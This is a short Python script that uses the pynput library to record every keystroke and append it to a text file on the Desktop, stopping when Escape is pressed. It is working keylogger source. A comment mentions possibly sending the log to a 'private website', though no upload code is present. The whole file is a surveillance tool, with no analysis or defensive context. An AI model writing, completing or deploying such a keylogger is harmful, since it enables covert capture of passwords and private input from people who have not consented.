import pynput

from pynput import keyboard
import os
#import Timer

class keyboardLog: #Make a keylogger and put it in a log (might wanna send it to a private website)
    def on_press(key):
        keys = []
        keys.append(key)

        filePath = os.path.join(os.path.expanduser("~/Desktop"), "keylogMoment.txt")

        with open(filePath, "a") as f:
            for i in keys:
                f.write(str(key).replace("'", "").replace("Key.space", " ").replace("Key.ctrl_l", "[lctrl]").replace("Key.ctrl_r", "[rctrl]").replace("Key.shift", "[shift]").replace("Key.alt_l", "[lalt]").replace("Key.alt_r", "[ralt]").replace("Key.enter", "\n").replace("Key.esc", "[esc]").replace("Key.backspace", "[del]"))

    def on_release(key):
        if str(key) == 'Key.esc':
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()